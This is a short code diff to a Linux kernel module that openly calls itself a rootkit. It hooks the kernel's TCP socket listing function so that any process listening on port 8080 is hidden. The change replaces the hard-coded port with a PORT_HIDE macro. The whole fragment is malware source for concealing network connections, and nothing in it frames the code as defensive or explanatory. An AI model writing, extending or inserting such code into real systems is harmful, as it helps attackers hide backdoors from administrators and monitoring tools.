@@ -13,6 +13,7 @@
 #include <linux/uaccess.h>
 #include <linux/linkage.h>
 #include <linux/tcp.h>
+#define PORT_HIDE 0x1f90
 #define USE_FENTRY_OFFSET 0
 #define HOOK(_name, _hook, _orig)   \
 {                   \
@@ -25,7 +26,7 @@ static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     long ret;
     struct sock *sk = v;
-    if (sk != 0x1 && sk->sk_num == 0x1f90)
+    if (sk != 0x1 && sk->sk_num == PORT_HIDE)
     {
 		printk(KERN_ALERT "rootkit: Found process listening on port 8080 - hiding!\n");
 		return 0;
